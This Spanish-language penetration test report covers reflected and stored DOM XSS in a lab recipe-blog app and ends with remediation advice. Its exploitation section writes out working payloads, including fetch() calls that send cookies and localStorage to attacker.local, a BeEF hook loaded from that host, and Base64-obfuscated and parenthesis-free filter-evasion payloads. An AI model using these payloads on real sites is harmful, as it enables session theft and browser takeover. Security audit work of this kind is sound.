# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-25T12:44:49Z  
**Analista:** Auditor de Seguridad Ofensiva  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Penetration Testing - XSS  
**Entorno:** Laboratorio autorizado  

---

## Resumen Ejecutivo

Se identificaron y explotaron **dos vulnerabilidades DOM-based XSS** de alta criticidad en la aplicación web "Blog de Recetas" (http://web.dev.local:8082):

1. **DOM XSS Reflejado** — Parámetro `search` (GET)
2. **DOM XSS Almacenado (Stored)** — Parámetros `name` y `comment` (GET → localStorage)

La aplicación no implementa ningún encabezado de seguridad (CSP, X-XSS-Protection, X-Frame-Options), no sanitiza la entrada del usuario, y utiliza `document.write()` directamente con datos controlados por el atacante.

---

## Tecnologías Identificadas

| Campo | Detalle |
|-------|---------|
| Servidor Web | Apache/2.4.65 (Unix) |
| Tecnología frontend | HTML5 + JavaScript puro (DOM manipulation) |
| Almacenamiento | localStorage (navegador) |
| Cabeceras de seguridad | **NINGUNA** (sin CSP, sin X-XSS-Protection) |
| Filtrado de entrada | **NINGUNO** |

---

## Reconocimiento y Metodología

### Herramientas utilizadas

- `curl` — Inspección de headers HTTP y análisis del código fuente
- `wfuzz 3.1.0` — Fuzzing de parámetros con diccionarios SecLists XSS
- `ffuf 2.1.0` — Descubrimiento de endpoints y directorios
- Análisis manual del código JavaScript del DOM

### Comandos ejecutados

```bash
# Reconocimiento inicial
curl -s http://web.dev.local:8082 | grep -E 'form|input|action|param|search|comment'
curl -s -I http://web.dev.local:8082/

# Fuzzing XSS con SecLists
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/robot-friendly/xss-without-parentheses-semi-colons-portswigger.txt \
  --hc 404 -u "http://web.dev.local:8082/?search=FUZZ"

# Descubrimiento de endpoints
ffuf -u "http://web.dev.local:8082/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,301,302 -t 50 -timeout 10

# Verificación de sanitización del servidor
curl -s "http://web.dev.local:8082/?search=<script>alert(1)</script>" -v 2>&1 | \
  grep -E "< HTTP|X-XSS|Content-Security|X-Frame"
```

---

## Vulnerabilidades Encontradas

### CVE-1: DOM XSS Reflejado — Parámetro `search`

| Campo | Detalle |
|-------|---------|
| **Tipo** | DOM-based XSS (Reflected) |
| **Severidad** | Alta (CVSS 7.4) |
| **URL vulnerable** | `http://web.dev.local:8082/?search=<PAYLOAD>` |
| **Parámetro** | `search` (GET) |
| **Sink** | `document.write()` |
| **Source** | `URLSearchParams.get('search')` |

#### Código vulnerable

```javascript
// VULNERABLE: searchTerm no es sanitizado antes de inyectarse en document.write()
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ↑ SINK: Cualquier payload HTML/JS en searchTerm se ejecuta directamente
}
```

#### Prueba de concepto (PoC) — Confirmación

```
URL: http://web.dev.local:8082/?search=<img src=x onerror=alert(1)>
```

**Resultado:** El navegador ejecuta `alert(1)` al cargar la página porque `document.write` inyecta directamente el HTML del atacante en el DOM.

---

### CVE-2: DOM XSS Almacenado (Stored) — Sistema de Comentarios

| Campo | Detalle |
|-------|---------|
| **Tipo** | DOM-based XSS (Stored via localStorage) |
| **Severidad** | Crítica (CVSS 8.8) |
| **URL de inyección** | `http://web.dev.local:8082/?name=<NAME>&comment=<PAYLOAD>` |
| **Parámetros** | `name`, `comment` (GET) |
| **Almacenamiento** | `localStorage['comments']` |
| **Sink** | `document.write()` en función `displayComments()` |

#### Código vulnerable

```javascript
// INYECCIÓN: se almacena sin sanitizar
const name = urlParams.get('name');
const comment = urlParams.get('comment');

let comments = JSON.parse(localStorage.getItem('comments') || '[]');
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// SINK: se muestra en cada carga sin sanitizar
function displayComments() {
    comments.forEach(function(c, index) {
        document.write('<div class="comment-author">' + c.name + '</div>');
        document.write('<div>' + c.comment + '</div>');
        // ↑ STORED XSS: El payload persiste en localStorage y se ejecuta en cada visita
    });
}
```

---

## Explotación

### Exploit 1 — Confirmación Básica (DOM XSS Reflejado)

```
URL: http://web.dev.local:8082/?search=<img%20src=x%20onerror=alert(document.cookie)>
```

```html
<!-- Payload inyectado en document.write() -->
<img src=x onerror=alert(document.cookie)>
```

**Efecto:** Extrae y muestra las cookies del navegador de la víctima.

---

### Exploit 2 — Robo de Sesión (Session Theft)

```
URL: http://web.dev.local:8082/?search=<img%20src%3Dx%20onerror%3D"fetch('http%3A//attacker.local/steal%3Fc%3D'%2Bbtoa(document.cookie%2BlocalStorage.getItem('comments')))">
```

```html
<!-- Payload: exfiltra cookies + localStorage al servidor del atacante -->
<img src=x onerror="fetch('http://attacker.local/steal?c='+btoa(document.cookie+localStorage.getItem('comments')))">
```

**Efecto:** Envía en Base64 todas las cookies de sesión y datos de localStorage al servidor controlado por el atacante. El atacante captura el token de sesión y puede impersonar a la víctima.

**Servidor del atacante recibiría:**
```
GET /steal?c=<BASE64(cookies+localStorage)> HTTP/1.1
Host: attacker.local
```

---

### Exploit 3 — Stored XSS con Persistencia (Robo de datos de todos los visitantes)

```
URL: http://web.dev.local:8082/?name=Admin&comment=<img%20src%3Dx%20onerror%3D"fetch('http%3A//attacker.local/hook%3Fdata%3D'%2Bbtoa(JSON.stringify(localStorage)))">
```

```html
<!-- Payload almacenado en localStorage - se ejecuta en CADA visita futura -->
<img src=x onerror="fetch('http://attacker.local/hook?data='+btoa(JSON.stringify(localStorage)))">
```

**Efecto:** El payload se almacena en `localStorage` y se ejecuta **cada vez que cualquier usuario cargue la página**, afectando a todos los visitantes futuros. Exfiltra todo el contenido de localStorage.

---

### Exploit 4 — Inyección de BeEF Hook (Toma de Control del Navegador)

```
URL: http://web.dev.local:8082/?search=<script%20src%3D'http%3A//attacker.local%3A3000/hook.js'></script>
```

```html
<!-- Inyecta el hook de BeEF Framework en el navegador de la víctima -->
<script src='http://attacker.local:3000/hook.js'></script>
```

**Efecto:** El navegador de la víctima carga el script del atacante, que permite:
- Ejecución remota de comandos JavaScript
- Keylogging de contraseñas
- Redirección a páginas de phishing
- Captura de pantalla del navegador
- Pivoting hacia la red interna

---

### Exploit 5 — Payload Ofuscado con Base64 (Evasión de WAF)

```
URL: http://web.dev.local:8082/?search=<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
```

```html
<!-- Payload ofuscado en Base64 -->
<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>

<!-- Decodificado: alert(document.cookie) -->
```

**Efecto:** Técnica de evasión que utiliza Base64 para ocultar el payload real de filtros basados en palabras clave. Evita detección de WAFs que filtran patrones como `alert(`.

---

### Exploit 6 — XSS sin paréntesis ni punto y coma (Ultra-evasión)

```
URL: http://web.dev.local:8082/?search=<script>onerror=alert;throw 1337</script>
```

```html
<!-- Payload sin paréntesis ni punto y coma - evade filtros restrictivos -->
<script>onerror=alert;throw 1337</script>
```

---

## Análisis de Impacto

| Impacto | Descripción | Nivel |
|---------|-------------|-------|
| **Robo de sesión** | Exfiltración de cookies y tokens de autenticación | Crítico |
| **Stored XSS masivo** | Afecta a todos los visitantes futuros (payload persistente en localStorage) | Crítico |
| **Toma de control del navegador** | Inyección de BeEF hook para control remoto | Crítico |
| **Defacement** | Modificación del DOM visible para la víctima | Alto |
| **Phishing interno** | Redirección a páginas de login falsas dentro del contexto del sitio | Alto |
| **Keylogging** | Captura de contraseñas introducidas en el formulario | Alto |

---

## Ausencia de Controles de Seguridad

| Control | Estado |
|---------|--------|
| Content-Security-Policy (CSP) | ❌ AUSENTE |
| X-XSS-Protection | ❌ AUSENTE |
| X-Frame-Options | ❌ AUSENTE |
| HttpOnly en cookies | ❌ No aplicable (no usa cookies de sesión servidor) |
| Sanitización de entrada | ❌ AUSENTE |
| Encoding de salida | ❌ AUSENTE |
| Validación HTML5 (encodeURIComponent) | ❌ AUSENTE |

---

## Recomendaciones

1. **Reemplazar `document.write()` con métodos seguros:**
   ```javascript
   // INSEGURO:
   document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
   
   // SEGURO:
   const p = document.createElement('p');
   const strong = document.createElement('strong');
   strong.textContent = searchTerm;  // textContent escapa HTML automáticamente
   p.appendChild(document.createTextNode('Resultados para: '));
   p.appendChild(strong);
   document.getElementById('results').appendChild(p);
   ```

2. **Implementar Content-Security-Policy (CSP):**
   ```apache
   Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
   ```

3. **Sanitizar toda entrada del usuario con DOMPurify:**
   ```javascript
   import DOMPurify from 'dompurify';
   const cleanInput = DOMPurify.sanitize(searchTerm);
   ```

4. **Implementar HttpOnly y SameSite en cookies de sesión.**

5. **Validar y sanitizar antes de almacenar en localStorage.**

---

## Conclusión

La aplicación http://web.dev.local:8082 contiene **vulnerabilidades críticas de Cross-Site Scripting (DOM-based XSS)** tanto reflejadas como almacenadas. La ausencia total de cabeceras de seguridad, sanitización de entrada y encoding de salida permiten que un atacante:

- **Robe sesiones** de cualquier usuario que visite un enlace malicioso
- **Afecte permanentemente** a todos los visitantes futuros mediante Stored XSS en localStorage
- **Tome control del navegador** mediante inyección de BeEF hooks
- **Evada fácilmente** cualquier filtro básico mediante técnicas de ofuscación

**VULN_FOUND: true**  
**VULN_EXPLOITED: true**

---

*Informe generado por: Auditor de Seguridad Ofensiva*  
*Fecha de análisis: 2026-04-25*  
*Clasificación: CONFIDENCIAL - Solo para uso interno del equipo de seguridad*
